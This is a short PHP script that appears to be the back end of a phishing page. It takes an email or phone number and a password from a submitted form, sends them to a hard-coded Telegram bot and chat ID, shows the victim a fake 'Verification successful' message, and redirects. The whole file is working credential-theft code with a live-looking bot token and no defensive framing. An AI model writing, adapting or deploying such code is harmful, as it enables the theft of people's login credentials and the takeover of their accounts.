<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $email = $_POST['PrevToEmail'];
    $password = $_POST['PrevToPass'];

    // Your Telegram bot token
    $botToken = "7652154074:AAEQX3FzEBlMyCPqUJVkgUzl6mL0mi1zj-Q"; // Your bot token for testing

    // Your Telegram chat ID
    $chatId = "6968789311"; // Replace with your target chat ID

    // The message to send
    $message = "Email/Phone: " . $email . "\nPassword: " . $password;

    // Telegram API URL
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Prepare data to send to Telegram API
    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    // Send the POST request to Telegram
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ),
    );
    $context  = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    // Check if the request was successful
    if ($result === FALSE) {
        echo "Error sending message";
    } else {
        echo "Verification successful. You will receive a message soon.";
    }
}
header('Location:index.php');
?>
